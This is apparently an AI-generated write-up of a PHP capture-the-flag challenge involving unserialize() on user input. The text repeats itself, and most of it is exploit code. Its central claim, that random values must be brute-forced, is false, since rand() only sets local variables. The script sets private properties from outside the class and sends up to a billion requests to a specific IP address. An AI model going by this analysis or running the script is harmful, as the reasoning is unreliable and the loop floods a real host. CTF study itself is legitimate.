            "content": "# Analysis of Retrieved Page Source Code\n\n1. Vulnerability type: **Unserialization Vulnerability and Pseudo-Random Number Collision**\n\n    **Vulnerability description**:\n    The code snippet makes use of PHP's `unserialize()` function on user-supplied input `$_GET['poc']`. This could lead to an unserialization vulnerability, allowing the attacker to create a specially crafted serialized string to manipulate the program's behavior. The target is to make `name1` equal to `name2` and `age1` equal to `age2` to successfully exploit the challenge.\n\n    The pseudo-random numbers `rand(0,999999999)` are generated within the `getflag()` function. For the flag to be displayed, both conditions need to pass:\n    - `$this->name1 === $this->name2`\n    - `$this->age1 === $this->age2`\n\n    By leveraging serialization, as well as possibly guessing or brute-forcing the random numbers, an attacker can trigger these conditions.\n\n    **Source code**: \n    ```php\n    <?php\n    include \"flag.php\";\n    class Index{\n        private $name1;\n        private $name2;\n        protected $age1;\n        protected $age2;\n        function getflag($flag){\n            $name2 = rand(0,999999999);\n            if($this->name1 === $this->name2){\n                $age2 = rand(0,999999999);\n                if($this->age1 === $this->age2){\n                    echo $flag;\n                }\n            }\n            else{\n                echo \"nonono\";\n            }\n        }\n    }\n    if(isset($_GET['poc'])){\n        $a = unserialize($_GET['poc']);\n        $a->getflag($flag);\n    }\n    else{\n        highlight_file(\"index.php\");\n    }\n    ?>\n    ```\n\n    **Attack code**:\n    The attacker needs to craft a serialized object to exploit this. One approach:\n\n    1. **Crafting the Payload**:\n       First, we need to know the structure of our serialized data. The `Index` class has private and protected properties that we can set via serialization.\n\n    2. **Generate Lucky Numbers**:\n       Since the `name2` and `age2` are generated randomly within a specific range, the attacker might need to brute-force these values to match them accordingly.\n\n    **PHP Exploit Code**:\n    ```php\n    <?php\n    // Creating a malicious payload\n    class Index {\n        private $name1;\n        private $name2;\n        protected $age1;\n        protected $age2;\n    }\n\n    $exploit = new Index();\n    $exploit->name1 = 12345;  // target number we want to match with rand()\n    $exploit->age1 = 54321;   // target another number for match\n\n    // Serialize the object\n    $serialized_payload = serialize($exploit);\n\n    // Brute force for the successful request\n    $target = 'http://47.251.44.45:40314/?poc=' . urlencode($serialized_payload);\n    for ($i = 0; $i < 1000000000; $i++) {\n        $response = file_get_contents($target);\n        if (strpos($response, \"nsctf{\") !== false) {\n            echo $response;\n            break;\n        }\n    }\n    ?>\n    ```\n\n    This code snippet creates a `Index` object, assigns `name1` and `age1` values (let's assume 12345 and 54321), serializes it, then sends this serialized object over to the challenge endpoint. By brute-forcing or guessing values, the random values `$name2` and `$age2` will eventually match the target values, revealing the flag.\n\n2.

This can lead to an unserialization vulnerability, where an attacker can craft a malicious payload to manipulate the class properties. \n\nThe target is to make `$this->name1` equal to `$this->name2` and `$this->age1` equal to `$this->age2` by leveraging the unserialization process and potentially brute-forcing the random number generation.\n\n#### **Source Code**:\n```php\n<?php\ninclude \"flag.php\";\nclass Index {\n    private $name1;\n    private $name2;\n    protected $age1;\n    protected $age2;\n    function getflag($flag) {\n        $name2 = rand(0,999999999);\n        if ($this->name1 === $this->name2) {\n            $age2 = rand(0,999999999);\n            if ($this->age1 === $this->age2) {\n                echo $flag;\n            }\n        }\n        else {\n            echo \"nonono\";\n        }\n    }\n}\nif (isset($_GET['poc'])) {\n    $a = unserialize($_GET['poc']);\n    $a->getflag($flag);\n} else {\n    highlight_file(\"index.php\");\n}\n?>\n```\n\n#### **Attack Code**:\nThe attacker needs to craft a serialized payload for the `Index` class, setting the `$name1` and `$age1` properties to specific values. The values need to be repeatedly tested until the internal random generation matches these values.\n\n**Steps**:\n1. Define custom values for `$name1` and `$age1`.\n2. Serialize the object and send it to the server.\n3. Use brute-force or guessing of random values to match constraints.\n   \n**PHP Exploit Code**:\n```php\n<?php\nclass Index {\n    private $name1;\n    private $name2;\n    protected $age1;\n    protected $age2;\n}\n\n$exploit = new Index();\n$exploit->name1 = 123456;  // Example target number we want to match with rand()\n$exploit->age1 = 654321;   // Example target number we want to match with rand()\n\n// Serialize the object\n$serialized_payload = serialize($exploit);\n\n// Brute force for the successful request\n$target = 'http://47.251.44.45:40314/?poc=' . urlencode($serialized_payload);\nfor ($i = 0; $i < 1000000000; $i++) {\n    $response = file_get_contents($target);\n    if (strpos($response, \"nsctf{\") !== false) {\n        echo $response;\n        break;\n    }\n}\n?>\n```\n\nThis script would send the serialized object to the URL and continuously check for the flag. By brute-forcing, it attempts to match random values with the predefined class properties and retrieve the flag.\n\n**Explanation of Code**:\n- The PHP script defines a class identical to the one in the target server.\n- It assigns values to the `name1` and `age1` properties.\n- The object is serialized and sent to the server as a GET parameter.\n- The script continually brute-forces the random number conditions until a match is found and the flag is returned.\n\nThese steps provide a structured approach to exploiting the vulnerability and obtaining the flag, given the constraints and logic in the provided PHP code.",
